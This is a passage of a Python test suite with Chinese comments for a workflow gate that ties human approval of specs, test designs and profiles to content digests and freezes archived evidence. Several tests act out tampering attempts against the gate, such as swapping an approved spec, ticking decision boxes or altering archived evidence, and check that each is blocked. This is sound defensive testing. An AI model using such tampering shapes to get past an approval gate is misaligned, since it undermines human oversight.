            bf.write_text(bf.read_text(encoding='utf-8')+'\n附註：事後追加的說明\n',encoding='utf-8')
            x=self._run(r,'archive','demo')
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,'被換過的 browser evidence 不得被 archive 接受\n'+out)
            self.assertIn('browser evidence 與 verification-pass 當時驗收的那一份不符',out,out)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_archive_rejects_log_record_without_browser_digest(self):
        """舊 log 沒有這個欄位時必須 fail-closed，不得當成「沒有 browser evidence 要驗」。"""
        td,r=self._repo()
        try:
            self._approved_engineering(r)
            v=self._run(r,'verification-pass','demo')
            self.assertEqual(v.returncode,0,v.stdout+v.stderr)
            lg=r/'workflow/state-log.md'
            lg.write_text(re.sub(r'^- Browser evidence sha256:.*\n','',
                                 lg.read_text(encoding='utf-8'),flags=re.M),encoding='utf-8')
            x=self._run(r,'archive','demo')
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,out)
            self.assertIn('請重跑 verification-pass',out,out)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_honest_flow_still_reaches_archive(self):
        """對照組。上面幾條若靠「一律拒絕」通過，這條會紅。"""
        td,r=self._repo()
        try:
            self._approved_engineering(r)
            v=self._run(r,'verification-pass','demo')
            self.assertEqual(v.returncode,0,v.stdout+v.stderr)
            a=self._run(r,'archive','demo')
            self.assertEqual(a.returncode,0,a.stdout+a.stderr)
            self.assertIn('Phase: ARCHIVE',(r/'workflow/STATE.md').read_text(encoding='utf-8'))
        finally: shutil.rmtree(td,ignore_errors=True)



class RC5Round15Tests(unittest.TestCase):
    """Codex 第十四輪的三個 blocker + 一個完整性問題。

    共同主題：**批准綁的是內容不是旗標**（第十三輪對 profile 修過一次，
    但更核心的 spec / test design 仍是裸旗標），以及**生命週期沒有第二輪**。
    """

    def _repo(self):
        td=Path(tempfile.mkdtemp(prefix='rc5r15-')); r=td/'repo'; r.mkdir()
        for rel in OWNED:
            src=SRC/rel
            if not src.exists(): continue
            dst=r/rel
            if src.is_dir():
                shutil.copytree(src,dst,dirs_exist_ok=True,ignore=shutil.ignore_patterns('__pycache__','*.pyc','node_modules','dist','build','.next','venv','.venv','coverage','playwright-report','test-results'))
            else:
                dst.parent.mkdir(parents=True,exist_ok=True); shutil.copy2(src,dst)
        (r/'.githooks/pre-commit').chmod(0o755)
        for c in (['git','init','-b','main'],['git','config','user.email','a@example.invalid'],
                  ['git','config','user.name','A']):
            subprocess.run(c,cwd=r,check=True,capture_output=True)
        return td,r

    def _run(self,r,*args):
        return subprocess.run(['python3','workflow/bin/workflow_transition.py',*args],
                              cwd=r,capture_output=True,text=True)

    def _set_profile(self,r,**kv):
        p=r/'PROJECT-PROFILE.md'; t=p.read_text(encoding='utf-8')
        for k,v in kv.items():
            k=k.replace('_',' ')
            t=re.sub(rf'^{re.escape(k)}:[ \t]*.*$',f'{k}: {v}',t,count=1,flags=re.M)
        p.write_text(t,encoding='utf-8')

    def _engineering(self,r,change='demo'):
        """已批准 profile/spec/test-design 且位於 ENGINEERING 的合法狀態。"""
        self._set_profile(r,Type='API',Web_verification_required='no',
                          Primary_stack='Python 3.12',Package_manager='uv',Monorepo='no',
                          CI_provider='GitHub Actions',Test_database_strategy='not-applicable')
        d=r/'openspec/changes'/change; d.mkdir(parents=True,exist_ok=True)
        (d/'proposal.md').write_text('# Spec A\n只做 X，絕不碰付款。\n',encoding='utf-8')
        (d/'tasks.md').write_text('# Tasks\n- [ ] 實作 X\n',encoding='utf-8')
        tc=r/'workflow/test-cases'; tc.mkdir(parents=True,exist_ok=True)
        (tc/f'{change}.md').write_text('# Test Design A\n- [ ] 驗證 X\n',encoding='utf-8')
        (r/'package.json').write_text(json.dumps({"scripts":{"test":"echo ok","build":"echo b"}}),
                                      encoding='utf-8')
        sys.path.insert(0,str(r/'workflow/bin'))
        try:
            import workflow_state as W
            importlib.reload(W)
            _,_,_,dg=W.profile_resolution(r)
            W.write_state(r/'workflow/STATE.md',
                          W.WorkflowState('ENGINEERING','GREENFIELD',change,'yes','yes','no',
                                          'human',W.now_iso(),dg,
                                          W.spec_digest(r,change),W.test_design_digest(r,change)))
        finally: sys.path.remove(str(r/'workflow/bin'))
        subprocess.run(['git','add','-A'],cwd=r,check=True,capture_output=True)
        subprocess.run(['git','-c','core.hooksPath=/dev/null','commit','-m','approved'],
                       cwd=r,check=True,capture_output=True)

    def _gate(self,r):
        return subprocess.run(['python3','workflow/bin/check-implementation-gate.py','--staged'],
                              cwd=r,capture_output=True,text=True)

    # ---- Blocker 1：spec / test design 綁內容 ---------------------------------

    def test_spec_swap_after_approval_blocks_product_commits(self):
        """批准 Spec A 之後換成 Spec B —— 一般 commit 原本會放行，STATE 仍顯示已批准。"""
        td,r=self._repo()
        try:
            self._engineering(r)
            (r/'app.py').write_text('print(1)\n',encoding='utf-8')
            subprocess.run(['git','add','app.py'],cwd=r,check=True,capture_output=True)
            ok=self._gate(r)
            self.assertEqual(ok.returncode,0,'前提：未改動時產品 commit 應放行\n'+ok.stdout+ok.stderr)
            # 掉包並 commit：三來源一致，因此由 digest 層擋下。
            # 只改 worktree 的形狀由 test_uncommitted_spec_swap_is_caught_too 鎖住。
            (r/'openspec/changes/demo/proposal.md').write_text(
                '# Spec B\n直接對外開放付款 API，不做驗證。\n',encoding='utf-8')
            recommit_paths(r,'openspec/changes/demo',msg='swap spec')
            x=self._gate(r)
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,out)
            self.assertIn('OpenSpec change 的內容與人類批准的不一致',out,out)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_test_design_swap_after_approval_blocks_product_commits(self):
        td,r=self._repo()
        try:
            self._engineering(r)
            (r/'app.py').write_text('print(1)\n',encoding='utf-8')
            subprocess.run(['git','add','app.py'],cwd=r,check=True,capture_output=True)
            (r/'workflow/test-cases/demo.md').write_text('# Test Design B\n- [ ] 不用測\n',
                                                         encoding='utf-8')
            recommit_paths(r,'workflow/test-cases/demo.md',msg='swap test design')
            x=self._gate(r)
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,out)
            self.assertIn('Test design 的內容與人類批准的不一致',out,out)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_uncommitted_spec_swap_is_caught_too(self):
        """**綁定層。** 掉包只發生在 worktree（或只 stage 進 index）時，digest 比對
        讀 worktree 可能仍然相符，但 commit 出去的是另一份。fresh-clone 不變式
        套用在內容上：批准綁的是會被 commit 出去的那一份。"""
        td,r=self._repo()
        try:
            self._engineering(r)
            (r/'app.py').write_text('print(1)\n',encoding='utf-8')
            subprocess.run(['git','add','app.py'],cwd=r,check=True,capture_output=True)
            (r/'openspec/changes/demo/proposal.md').write_text(
                '# Spec B\n直接對外開放付款 API。\n',encoding='utf-8')
            x=self._gate(r)
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,out)
            self.assertIn('三者內容不一致',out,out)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_progress_checkboxes_do_not_invalidate_approval(self):
        """**對照組，而且是設計的一部分。**

        `tasks.md` 與 test-cases 的 `[x]` 是進度，在 ENGINEERING 期間本來就會更新。
        把它算進 digest 會讓每打一個勾就撤銷一次人類批准 —— 那不是收緊，
        是把 gate 變成噪音來源，使用者會學會繞過它。
        """
        td,r=self._repo()
        try:
            self._engineering(r)
            (r/'app.py').write_text('print(1)\n',encoding='utf-8')
            subprocess.run(['git','add','app.py'],cwd=r,check=True,capture_output=True)
            (r/'openspec/changes/demo/tasks.md').write_text('# Tasks\n- [x] 實作 X\n',encoding='utf-8')
            (r/'workflow/test-cases/demo.md').write_text('# Test Design A\n- [x] 驗證 X\n',
                                                         encoding='utf-8')
            x=self._gate(r)
            self.assertEqual(x.returncode,0,'打勾是進度，不得撤銷批准\n'+x.stdout+x.stderr)
            # 但**文字**改動仍必須被擋
            (r/'openspec/changes/demo/tasks.md').write_text('# Tasks\n- [x] 改成做 Y\n',
                                                            encoding='utf-8')
            y=self._gate(r)
            self.assertNotEqual(y.returncode,0,'任務文字改動必須被擋\n'+y.stdout+y.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_deleting_approved_spec_is_not_a_bypass(self):
        """刪檔不得等於通過。digest 必須能區分「缺檔」與「空檔」。"""
        td,r=self._repo()
        try:
            self._engineering(r)
            (r/'app.py').write_text('print(1)\n',encoding='utf-8')
            subprocess.run(['git','add','app.py'],cwd=r,check=True,capture_output=True)
            (r/'openspec/changes/demo/proposal.md').unlink()
            x=self._gate(r)
            self.assertNotEqual(x.returncode,0,x.stdout+x.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)

    # ---- Blocker 3：ARCHIVE 之後必須能開下一個 change --------------------------

    def test_archive_is_a_legal_start_point_for_the_next_change(self):
        """**這不是安全漏洞，是工具不能用。**

        AGENTS.md 明寫「ARCHIVE 後必須開新 change」，revert-to-spec 拒絕 ARCHIVE 時
        也叫使用者「請建立新的 OpenSpec change」—— 但 start-change 原本只接受
        DISCOVERY/SPECIFICATION，等於做完第一個 change 之後就沒有第二輪入口。
        十三輪對抗審查沒發現，因為大家都停在 SPEC_REVIEW 之前。
        """
        td,r=self._repo()
        try:
            self._engineering(r,'first-change')
            p=r/'workflow/STATE.md'
            p.write_text(re.sub(r'^Phase:.*$','Phase: ARCHIVE',
                                p.read_text(encoding='utf-8'),flags=re.M),encoding='utf-8')
            # ARCHIVE transition 必須已進入 Git 歷史才能開下一輪：清掉 STATE 上一輪的
            # digest 之前，那份 STATE 必須先被保存下來。
            recommit(r,'archive first-change')
            nxt=r/'openspec/changes/second-change'; nxt.mkdir(parents=True)
            (nxt/'proposal.md').write_text('x',encoding='utf-8')
            x=self._run(r,'start-change','second-change')
            self.assertEqual(x.returncode,0,'ARCHIVE 必須是合法起點\n'+x.stdout+x.stderr)
            state=p.read_text(encoding='utf-8')
            self.assertIn('Phase: SPECIFICATION',state,state)
            self.assertIn('Active OpenSpec change: second-change',state,state)
            self.assertIn('Project mode: GREENFIELD',state,'project mode 是 repository 屬性，應保留')
            for field in ('Spec approved: no','Test design approved: no','Verification passed: no',
                          'Approved by: none','Approved profile digest: none',
                          'Approved spec digest: none','Approved test design digest: none'):
                self.assertIn(field,state,
                              f'新的一輪必須從零開始批准；少清一個就等於繼承上一輪的批准：缺 {field}\n'+state)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_next_change_cannot_reuse_the_archived_change_name(self):
        """沿用同名會讓新一輪的 evidence 寫進已封存那一輪的目錄。"""
        td,r=self._repo()
        try:
            self._engineering(r,'demo')
            p=r/'workflow/STATE.md'
            p.write_text(re.sub(r'^Phase:.*$','Phase: ARCHIVE',
                                p.read_text(encoding='utf-8'),flags=re.M),encoding='utf-8')
            recommit(r,'archive demo')
            x=self._run(r,'start-change','demo')
            out=x.stdout+x.stderr
            self.assertEqual(x.returncode,34,out)
            self.assertIn('與剛封存的那一個相同',out,out)
        finally: shutil.rmtree(td,ignore_errors=True)

    # ---- 完整性：ARCHIVE 之後 evidence 凍結 -----------------------------------

    def test_archived_evidence_is_frozen(self):
        td,r=self._repo()
        try:
            self._engineering(r)
            ev=r/'workflow/evidence/demo/core'; ev.mkdir(parents=True)
            (ev/'20260101T000000Z.md').write_text('# ev\n',encoding='utf-8')
            (r/'workflow/evidence/demo/browser.md').write_text('# browser\n',encoding='utf-8')
            subprocess.run(['git','add','-A'],cwd=r,check=True,capture_output=True)
            subprocess.run(['git','-c','core.hooksPath=/dev/null','commit','-m','ev'],
                           cwd=r,check=True,capture_output=True)
            p=r/'workflow/STATE.md'
            p.write_text(re.sub(r'^Phase:.*$','Phase: ARCHIVE',
                                p.read_text(encoding='utf-8'),flags=re.M),encoding='utf-8')
            (ev/'20260101T000000Z.md').write_text('# tampered\n',encoding='utf-8')
            subprocess.run(['git','add','workflow/evidence'],cwd=r,check=True,capture_output=True)
            x=self._gate(r)
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,out)
            self.assertIn('不得修改不屬於目前工作範圍的 evidence',out,out)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_evidence_is_writable_before_archive(self):
        """對照組：凍結只在 ARCHIVE 生效，否則 verification-pass 自己就寫不了 evidence。"""
        td,r=self._repo()
        try:
            self._engineering(r)
            ev=r/'workflow/evidence/demo/core'; ev.mkdir(parents=True)
            (ev/'20260101T000000Z.md').write_text('# ev\n',encoding='utf-8')
            subprocess.run(['git','add','-A'],cwd=r,check=True,capture_output=True)
            x=self._gate(r)
            self.assertEqual(x.returncode,0,'ENGINEERING 階段 evidence 必須可寫\n'+x.stdout+x.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)

    # ---- Blocker 2：critical journeys ----------------------------------------

    def test_journeys_are_part_of_the_approved_profile_digest(self):
        """批准含「結帳、付款」的 profile 後改成「首頁」，digest 原本完全不變。"""
        td,r=self._repo()
        try:
            self._set_profile(r,Type='WEB_APP',Web_verification_required='yes',
                              Primary_stack='Next.js',Package_manager='pnpm',Monorepo='no',
                              CI_provider='GitHub Actions',Test_database_strategy='not-applicable')
            pp=r/'PROJECT-PROFILE.md'
            pp.write_text(pp.read_text(encoding='utf-8').replace(
                '## Critical user journeys\n- 尚未定義',
                '## Critical user journeys\n- [J1] 使用者可完成結帳與付款'),encoding='utf-8')
            sys.path.insert(0,str(r/'workflow/bin'))
            try:
                import workflow_state as W
                importlib.reload(W)
                _,_,_,before=W.profile_resolution(r)
                self.assertIsNotNone(before,'WEB 專案定義 journeys 之後應可解析')
                pp.write_text(pp.read_text(encoding='utf-8').replace(
                    '- [J1] 使用者可完成結帳與付款','- [J1] 首頁可載入'),encoding='utf-8')
                _,_,_,after=W.profile_resolution(r)
                self.assertNotEqual(before,after,'改動 journeys 必須改變 digest')
            finally: sys.path.remove(str(r/'workflow/bin'))
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_web_project_without_journeys_is_unresolved(self):
        td,r=self._repo()
        try:
            self._set_profile(r,Type='WEB_APP',Web_verification_required='yes',
                              Primary_stack='Next.js',Package_manager='pnpm',Monorepo='no',
                              CI_provider='GitHub Actions',Test_database_strategy='not-applicable')
            sys.path.insert(0,str(r/'workflow/bin'))
            try:
                import workflow_state as W
                importlib.reload(W)
                unres,_,_,dg=W.profile_resolution(r)
                self.assertIsNone(dg,'WEB 專案沒有 journeys 不得產生 digest')
                self.assertTrue(any('journey' in u.lower() for u in unres),unres)
            finally: sys.path.remove(str(r/'workflow/bin'))
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_example_journeys_in_html_comment_are_not_parsed(self):
        """PROJECT-PROFILE 用 HTML 註解放範例；不剝掉的話全新 profile 會憑空「已定義」。"""
        td,r=self._repo()
        try:
            sys.path.insert(0,str(r/'workflow/bin'))
            try:
                import workflow_state as W
                importlib.reload(W)
                self.assertEqual(W.critical_journeys(r),[],
                                 '註解裡的範例不得被當成真的 journey')
            finally: sys.path.remove(str(r/'workflow/bin'))
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_browser_evidence_must_cover_every_approved_journey(self):
        """SHA-256 只證明「文字沒被換掉」，不證明它覆蓋了被批准的範圍。"""
        td,r=self._repo()
        try:
            self._set_profile(r,Type='WEB_APP',Web_verification_required='yes',
                              Primary_stack='Next.js',Package_manager='pnpm',Monorepo='no',
                              CI_provider='GitHub Actions',Test_database_strategy='not-applicable')
            pp=r/'PROJECT-PROFILE.md'
            pp.write_text(pp.read_text(encoding='utf-8').replace(
                '## Critical user journeys\n- 尚未定義',
                '## Critical user journeys\n- [J1] 結帳\n- [J2] 付款'),encoding='utf-8')
            st=r/'workflow/STATE.md'
            st.write_text(re.sub(r'^Active OpenSpec change:.*$','Active OpenSpec change: demo',
                                 st.read_text(encoding='utf-8'),flags=re.M),encoding='utf-8')
            # core evidence 現在要自證來歷，否則 validate_browser 會先在
            # 「引用的 core evidence 未通過」失敗，測不到 journey 覆蓋這一層。
            dg=stamp_approved_profile(r)
            ed=r/'workflow/evidence/demo'; (ed/'core').mkdir(parents=True)
            core=ed/'core/20260101T000000Z.md'
            core.write_text('# ev\nCore evidence schema: 2\nChange: demo\n'
                            'Verification policy: auto\n'
                            f'Approved profile digest: {dg}\n'
                            'Checks selected: 1\nChecks executed: 1\n'
                            'Exit code: 0\nOutcome: PASS\nOverall exit code: 0\n',encoding='utf-8')
            rep=r/'playwright-report'; rep.mkdir(); (rep/'index.html').write_text('r',encoding='utf-8')
            def browser(body):
                (ed/'browser.md').write_text(
                    f'# Browser Verification Evidence\nCore evidence: {core.name}\n'
                    'Playwright report: playwright-report/index.html\n'
                    'Chrome DevTools MCP: checked\n'+body,encoding='utf-8')
            sys.path.insert(0,str(r/'workflow/bin'))
            try:
                import importlib.util as _iu
                spec=_iu.spec_from_file_location('wt_j',r/'workflow/bin/workflow_transition.py')
                m=_iu.module_from_spec(spec); sys.modules['wt_j']=m; spec.loader.exec_module(m)
                browser('J1: PASS\n')
                with self.assertRaises(SystemExit) as cm: m.validate_browser('demo')
                self.assertEqual(cm.exception.code,49)
                browser('J1: PASS\nJ2: FAIL\n')
                with self.assertRaises(SystemExit) as cm: m.validate_browser('demo')
                self.assertEqual(cm.exception.code,49)
                browser('J1: PASS\nJ2: PASS\n')
                m.validate_browser('demo')   # 不得拋出

                # **隔離測試**：validate_browser 自己那一道「WEB 專案必須定義
                # journeys」在正常流程裡到不了（profile_resolution 更早就擋了），
                # 所以突變它整組測試照樣綠。它不是獨立安全層，但在自己那一層提供
                # 明確訊息；鎖的是訊息，不是擋不擋。同 `profile_digest == none` 的處理。
                pp.write_text(pp.read_text(encoding='utf-8').replace(
                    '- [J1] 結帳\n- [J2] 付款','- 尚未定義'),encoding='utf-8')
                with self.assertRaises(SystemExit) as cm: m.validate_browser('demo')
                self.assertEqual(cm.exception.code,49)
            finally:
                sys.path.remove(str(r/'workflow/bin')); sys.modules.pop('wt_j',None)
        finally: shutil.rmtree(td,ignore_errors=True)


class RC5Round16Tests(unittest.TestCase):
    """Codex 第十六輪：四個 blocker 的修正各自的鎖。

    共同主題：**上一輪的修正都停在「能擋住我想到的那一種形狀」**，而每一條的
    真正判準都比那一種形狀更寬 —— 正規化的套用範圍、schema 的合法性、
    凍結的所有權、綁定的來源。
    """

    def _repo(self):
        td=Path(tempfile.mkdtemp(prefix='rc5r16-')); r=td/'repo'; r.mkdir()
        for rel in OWNED:
            src=SRC/rel
            if not src.exists(): continue
            dst=r/rel
            if src.is_dir():
                shutil.copytree(src,dst,dirs_exist_ok=True,ignore=shutil.ignore_patterns('__pycache__','*.pyc','node_modules','dist','build','.next','venv','.venv','coverage','playwright-report','test-results'))
            else:
                dst.parent.mkdir(parents=True,exist_ok=True); shutil.copy2(src,dst)
        (r/'.githooks/pre-commit').chmod(0o755)
        for c in (['git','init','-b','main'],['git','config','user.email','a@example.invalid'],
                  ['git','config','user.name','A']):
            subprocess.run(c,cwd=r,check=True,capture_output=True)
        return td,r

    def _run(self,r,*args):
        return subprocess.run(['python3','workflow/bin/workflow_transition.py',*args],
                              cwd=r,capture_output=True,text=True)

    def _gate(self,r):
        return subprocess.run(['python3','workflow/bin/check-implementation-gate.py','--staged'],
                              cwd=r,capture_output=True,text=True)

    def _set_profile(self,r,**kv):
        p=r/'PROJECT-PROFILE.md'; t=p.read_text(encoding='utf-8')
        for k,v in kv.items():
            k=k.replace('_',' ')
            t=re.sub(rf'^{re.escape(k)}:[ \t]*.*$',f'{k}: {v}',t,count=1,flags=re.M)
        p.write_text(t,encoding='utf-8')

    def _engineering(self,r,change='demo',web=False):
        self._set_profile(r,Type='WEB_APP' if web else 'API',
                          Web_verification_required='yes' if web else 'no',
                          Primary_stack='Python 3.12',Package_manager='uv',Monorepo='no',
                          CI_provider='GitHub Actions',Test_database_strategy='not-applicable')
        if web:
            pp=r/'PROJECT-PROFILE.md'
            pp.write_text(pp.read_text(encoding='utf-8').replace(
                '## Critical user journeys\n- 尚未定義',
                '## Critical user journeys\n- [J1] 結帳\n- [J2] 付款'),encoding='utf-8')
        d=r/'openspec/changes'/change; d.mkdir(parents=True,exist_ok=True)
        (d/'proposal.md').write_text('# Spec A\n## 已批准範圍\n- [ ] 啟用未驗證的公開付款 API\n',
                                     encoding='utf-8')
        (d/'tasks.md').write_text('# Tasks\n- [ ] 實作 X\n',encoding='utf-8')
        tc=r/'workflow/test-cases'; tc.mkdir(parents=True,exist_ok=True)
        (tc/f'{change}.md').write_text('# Test Design A\n- [ ] 驗證 X\n',encoding='utf-8')
        (r/'package.json').write_text(json.dumps({"scripts":{"test":"echo ok","build":"echo b"}}),
                                      encoding='utf-8')
        sys.path.insert(0,str(r/'workflow/bin'))
        try:
            import workflow_state as W
            importlib.reload(W)
            _,_,_,dg=W.profile_resolution(r)
            self.assertIsNotNone(dg,'前提：profile 必須完全解析')
            W.write_state(r/'workflow/STATE.md',
                          W.WorkflowState('ENGINEERING','GREENFIELD',change,'yes','yes','no',
                                          'human',W.now_iso(),dg,
                                          W.spec_digest(r,change) or 'none',
                                          W.test_design_digest(r,change) or 'none'))
        finally: sys.path.remove(str(r/'workflow/bin'))
        recommit(r,'approved')

    # ---- Blocker 3：正規化的套用範圍 -----------------------------------------

    def test_proposal_checkbox_is_a_decision_not_progress(self):
        """**這是勾選正規化真正的邊界。**

        `tasks.md` 的 `[x]` 是進度，正規化掉是對的。但同一段程式原本對整個
        change 目錄一律正規化，於是 proposal / spec 裡最常見的規格寫法 ——

            ## 已批准範圍
            - [ ] 啟用未驗證的公開付款 API

        —— 被勾成 `[x]` 之後 digest 完全不變。那是**相反的決定**，不是進度。
        """
        td,r=self._repo()
        try:
            self._engineering(r)
            (r/'app.py').write_text('print(1)\n',encoding='utf-8')
            subprocess.run(['git','add','app.py'],cwd=r,check=True,capture_output=True)
            ok=self._gate(r)
            self.assertEqual(ok.returncode,0,'前提：未改動時應放行\n'+ok.stdout+ok.stderr)
            (r/'openspec/changes/demo/proposal.md').write_text(
                '# Spec A\n## 已批准範圍\n- [x] 啟用未驗證的公開付款 API\n',encoding='utf-8')
            recommit_paths(r,'openspec/changes/demo',msg='tick a decision box')
            x=self._gate(r)
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,
                                'proposal 的勾選是決策，不是進度；改了必須撤銷批准\n'+out)
            self.assertIn('與人類批准的不一致',out,out)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_tasks_checkbox_is_still_progress(self):
        """對照組。範圍收窄不得把 tasks 的進度也一起收進去 ——
        那會讓每打一個勾就撤銷一次批准，使用者只會學會繞過 gate。"""
        td,r=self._repo()
        try:
            self._engineering(r)
            (r/'app.py').write_text('print(1)\n',encoding='utf-8')
            subprocess.run(['git','add','app.py'],cwd=r,check=True,capture_output=True)
            (r/'openspec/changes/demo/tasks.md').write_text('# Tasks\n- [x] 實作 X\n',
                                                            encoding='utf-8')
            recommit_paths(r,'openspec/changes/demo',msg='tick progress')
            x=self._gate(r)
            self.assertEqual(x.returncode,0,'tasks 打勾是進度，不得撤銷批准\n'+x.stdout+x.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_invalid_utf8_fails_closed(self):
        """`errors='replace'` 會把不同的非法 byte sequence 摘要成同一段文字
        （全部變成 U+FFFD），等於在 digest 上製造碰撞。必須 fail-closed。"""
        td,r=self._repo()
        try:
            self._engineering(r)
            sys.path.insert(0,str(r/'workflow/bin'))
            try:
                import workflow_state as W
                importlib.reload(W)
                before=W.spec_digest(r,'demo')
                self.assertIsNotNone(before)
                (r/'openspec/changes/demo/proposal.md').write_bytes(b'# Spec\n\xff\xfe binary\n')
                self.assertIsNone(W.spec_digest(r,'demo'),
                                  '非 UTF-8 內容必須讓 digest 無法計算，而不是被 replace 成別的字')
            finally: sys.path.remove(str(r/'workflow/bin'))
        finally: shutil.rmtree(td,ignore_errors=True)

    # ---- Blocker 4：journey schema -------------------------------------------

    def test_malformed_journey_is_not_silently_ignored(self):
        """`- [J 2] 結帳`（ID 裡多一個空格）原本會被 findall 直接忽略。
        於是 J1 讓 profile 看起來「已定義」，人類以為自己批准了兩條 journey，
        而 browser evidence 只寫 J1 就能通過。**靜默忽略等於把打錯字變成關閉檢查。**"""
        td,r=self._repo()
        try:
            pp=r/'PROJECT-PROFILE.md'
            pp.write_text(pp.read_text(encoding='utf-8').replace(
                '## Critical user journeys\n- 尚未定義',
                '## Critical user journeys\n- [J1] 結帳\n- [J 2] 付款'),encoding='utf-8')
            sys.path.insert(0,str(r/'workflow/bin'))
            try:
                import workflow_state as W
                importlib.reload(W)
                journeys,errors=W.journeys_status(r)
                self.assertTrue(errors,'不合格式的項目必須被回報，不得靜默跳過')
                _,invalid,_,dg=W.profile_resolution(r)
                self.assertTrue(invalid,'不合法的 journey 必須讓 profile 無法解析')
                self.assertIsNone(dg,'有非法值時不得產生 digest')
            finally: sys.path.remove(str(r/'workflow/bin'))
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_duplicate_journey_id_is_rejected(self):
        """`- [J1] 結帳` 與 `- [J1] 付款` 並存時，單一行 `J1: PASS`
        會同時滿足兩條 —— 一次驗證兌換兩條 journey 的覆蓋宣稱。"""
        td,r=self._repo()
        try:
            pp=r/'PROJECT-PROFILE.md'
            pp.write_text(pp.read_text(encoding='utf-8').replace(
                '## Critical user journeys\n- 尚未定義',
                '## Critical user journeys\n- [J1] 結帳\n- [J1] 付款'),encoding='utf-8')
            sys.path.insert(0,str(r/'workflow/bin'))
            try:
                import workflow_state as W
                importlib.reload(W)
                _,errors=W.journeys_status(r)
                self.assertTrue(any('重複' in why for _,_,why in errors),
                                f'重複 ID 必須被擋：{errors}')
            finally: sys.path.remove(str(r/'workflow/bin'))
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_contradictory_browser_results_are_rejected(self):
        """`J1: PASS` 與 `J1: FAIL` 並存時，`re.search` 只看到第一筆而放行。
        矛盾的結果不是「其中一筆有效」，是這份 evidence 不可信。"""
        td,r=self._repo()
        try:
            self._engineering(r,web=True)
            ed=r/'workflow/evidence/demo'; (ed/'core').mkdir(parents=True,exist_ok=True)
            (ed/'browser.md').write_text(
                '# Browser Verification Evidence\nCore evidence: x.md\n'
                'Playwright report: playwright-report/index.html\n'
                'Chrome DevTools MCP: checked\nJ1: PASS\nJ1: FAIL\nJ2: PASS\n',encoding='utf-8')
            # **隔離型測試。** 走 verification-pass 會先卡在 verify.sh（這個 fixture
            # 沒有 Playwright），那樣測到的是別的東西。直接呼叫驗證器本身 ——
            # 否則這一層可以被整個刪掉而測試照樣綠（Q7c 的教訓）。
            import contextlib, io
            sys.path.insert(0,str(r/'workflow/bin'))
            try:
                import workflow_state as W, workflow_transition as T
                importlib.reload(W); importlib.reload(T)
                err=io.StringIO()
                with contextlib.redirect_stderr(err), self.assertRaises(SystemExit) as cm:
                    T.validate_browser('demo')
                self.assertEqual(cm.exception.code,49,err.getvalue())
                self.assertIn('多筆結果',err.getvalue(),err.getvalue())
            finally: sys.path.remove(str(r/'workflow/bin'))
        finally: shutil.rmtree(td,ignore_errors=True)

    # ---- Blocker 2：evidence 凍結的判準是所有權 -------------------------------

    def test_previous_change_evidence_stays_frozen_in_the_next_round(self):
        """**第一版修法只擋住一種形狀。** 用 `phase=='ARCHIVE'` 當凍結條件，
        只要執行 `start-change B`，phase 離開 ARCHIVE，change A 的已封存 evidence
        立刻又可寫 —— 而 A 不會再被任何 archive 或 verification 比對。"""
        td,r=self._repo()
        try:
            self._engineering(r,'first-change')
            ev=r/'workflow/evidence/first-change/core'; ev.mkdir(parents=True)
            (ev/'20260101T000000Z.md').write_text('# ev\n',encoding='utf-8')
            recommit(r,'evidence')
            p=r/'workflow/STATE.md'
            p.write_text(re.sub(r'^Phase:.*$','Phase: ARCHIVE',
                                p.read_text(encoding='utf-8'),flags=re.M),encoding='utf-8')
            recommit(r,'archive')
            nxt=r/'openspec/changes/second-change'; nxt.mkdir(parents=True)
            (nxt/'proposal.md').write_text('x',encoding='utf-8')
            ok=self._run(r,'start-change','second-change')
            self.assertEqual(ok.returncode,0,'前提：ARCHIVE 是合法起點\n'+ok.stdout+ok.stderr)
            # 現在 phase=SPECIFICATION，舊的凍結條件不成立
            (ev/'20260101T000000Z.md').write_text('# tampered\n',encoding='utf-8')
            subprocess.run(['git','add','workflow/evidence'],cwd=r,check=True,capture_output=True)
            x=self._gate(r)
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,
                                '上一輪的封存證據在新一輪開始後仍必須凍結\n'+out)
            self.assertIn('不屬於目前工作範圍',out,out)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_other_change_evidence_frozen_even_while_engineering(self):
        """**隔離所有權那一半。**

        上一條測試裡新一輪停在 SPECIFICATION，光靠 phase 檢查就擋住了 ——
        突變證實：把 change 比對整段刪掉，那條測試照樣綠。真正需要所有權判準的
        形狀是「新一輪已經進到 ENGINEERING（phase 檢查放行），卻去改上一輪的證據」。
        """
        td,r=self._repo()
        try:
            self._engineering(r,'first-change')
            ev=r/'workflow/evidence/first-change/core'; ev.mkdir(parents=True)
            (ev/'20260101T000000Z.md').write_text('# ev\n',encoding='utf-8')
            recommit(r,'evidence for first-change')
            # 直接做出「second-change 正在 ENGINEERING」的狀態
            self._engineering(r,'second-change')
            s=(r/'workflow/STATE.md').read_text(encoding='utf-8')
            self.assertIn('Phase: ENGINEERING',s,s)
            self.assertIn('Active OpenSpec change: second-change',s,s)
            (ev/'20260101T000000Z.md').write_text('# tampered\n',encoding='utf-8')
            subprocess.run(['git','add','workflow/evidence'],cwd=r,check=True,capture_output=True)
            x=self._gate(r)
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,
                                'phase 允許寫 evidence，但只能寫**自己這一輪**的\n'+out)
